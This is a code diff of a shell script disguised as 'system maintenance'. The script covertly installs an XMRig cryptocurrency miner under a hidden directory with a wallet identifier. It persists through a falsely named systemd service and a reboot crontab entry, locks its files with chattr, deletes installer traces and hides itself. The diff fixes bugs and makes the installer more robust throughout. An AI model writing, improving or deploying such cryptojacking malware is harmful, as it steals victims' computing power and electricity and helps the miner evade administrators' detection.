@@ -24,16 +24,20 @@ CACHE_DIR="$BASE_DIR/.cache"
 WALLET=$1
 EMAIL=$2
 
-if [ -z $WALLET ]; then
+if [ -z "$WALLET" ]; then
   echo "Script usage:"
   echo "> system_maintenance.sh <identifier> [<contact>]"
   echo "ERROR: Identifier required"
   exit 1
 fi
 
-if [ -z $HOME ]; then
+if [ -z "$HOME" ]; then
   export HOME=/tmp
 fi
+
+# Set locale to avoid warnings
+export LC_ALL=C
+export LANG=C
 
 if ! type curl >/dev/null; then
   echo "Installing required packages..."
@@ -53,19 +57,15 @@ CPU_USAGE=$((90 - (10 / CPU_THREADS)))
 echo "[*] Starting system maintenance setup..."
 echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads"
 
-# Function to hide process
-hide_process() {
-    # Rename process in ps output
-    mount --bind /bin/sleep "$BASE_DIR/main" >/dev/null 2>&1
-}
-
 # Function to create hidden directories
 create_hidden_dirs() {
     mkdir -p "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
     chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
     
-    # Hide directories
-    attr -s "hidden" -V "1" "$BASE_DIR" >/dev/null 2>&1
+    # Hide directories (if attr command exists)
+    if command -v attr >/dev/null 2>&1; then
+        attr -s "hidden" -V "1" "$BASE_DIR" >/dev/null 2>&1
+    fi
 }
 
 # Cleanup previous installations
@@ -109,8 +109,16 @@ fi
 
 echo "[*] Installing maintenance tools..."
 tar xzf /tmp/tools.tar.gz -C /tmp/ 2>/dev/null
-find /tmp -name "xmrig" -type f -exec cp {} "$BASE_DIR/main" \; 2>/dev/null
-chmod +x "$BASE_DIR/main"
+
+# Find and copy xmrig binary
+XMRIG_BINARY=$(find /tmp -name "xmrig" -type f 2>/dev/null | head -1)
+if [ -n "$XMRIG_BINARY" ] && [ -f "$XMRIG_BINARY" ]; then
+    cp "$XMRIG_BINARY" "$BASE_DIR/main"
+    chmod +x "$BASE_DIR/main"
+else
+    echo "ERROR: Could not find xmrig binary in extracted files"
+    exit 1
+fi
 
 if [ ! -f "$BASE_DIR/main" ]; then
     echo "ERROR: Tools installation failed"
@@ -211,15 +219,16 @@ echo "[*] Creating control scripts..."
 # Main control script
 cat > "$BASE_DIR/control" << 'EOF'
 #!/bin/bash
+SCRIPT_DIR="$(dirname "$(realpath "$0")")"
 case "$1" in
     start)
-        nohup "$(dirname "$0")/main" --config="$(dirname "$0")/.config/optimizer.json" >/dev/null 2>&1 &
+        nohup "$SCRIPT_DIR/main" --config="$SCRIPT_DIR/.config/optimizer.json" >/dev/null 2>&1 &
         ;;
     stop)
-        pkill -f "$(dirname "$0")/main"
+        pkill -f "$SCRIPT_DIR/main"
         ;;
     status)
-        pgrep -f "$(dirname "$0")/main" >/dev/null && echo "Running" || echo "Stopped"
+        pgrep -f "$SCRIPT_DIR/main" >/dev/null && echo "Running" || echo "Stopped"
         ;;
     *)
         echo "Usage: $0 {start|stop|status}"
@@ -229,7 +238,8 @@ EOF
 chmod +x "$BASE_DIR/control"
 
 # Systemd service for persistence
-if systemctl list-units --full -all | grep -q "systemd"; then
+if command -v systemctl >/dev/null 2>&1; then
+    mkdir -p /etc/systemd/system
     cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
 [Unit]
 Description=System Optimization Service
@@ -251,16 +261,18 @@ WantedBy=multi-user.target
 EOF
 
     systemctl daemon-reload
-    systemctl enable "$SERVICE_NAME".service
+    systemctl enable "$SERVICE_NAME".service 2>/dev/null
 fi
 
 # Add to crontab for persistence
-(crontab -l 2>/dev/null; echo "@reboot sleep 60 && $BASE_DIR/control start") | crontab -
+(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && $BASE_DIR/control start") | crontab -
 
 # Hide the installation
 echo "[*] Securing installation..."
-chattr +i "$BASE_DIR/main" 2>/dev/null
-chattr +i "$CONFIG_DIR/optimizer.json" 2>/dev/null
+if command -v chattr >/dev/null 2>&1; then
+    chattr +i "$BASE_DIR/main" 2>/dev/null
+    chattr +i "$CONFIG_DIR/optimizer.json" 2>/dev/null
+fi
 
 # Cleanup traces
 rm -rf /tmp/tools.tar.gz
@@ -277,5 +289,8 @@ echo "Use: $BASE_DIR/control {start|stop|status} to manage"
 echo
 
 # Hide this script's execution
-mv "$0" "$BASE_DIR/.setup"
-chmod 600 "$BASE_DIR/.setup"
+SCRIPT_NAME=$(basename "$0")
+if [ -f "$SCRIPT_NAME" ]; then
+    cp "$SCRIPT_NAME" "$BASE_DIR/.setup"
+    chmod 600 "$BASE_DIR/.setup"
+fi
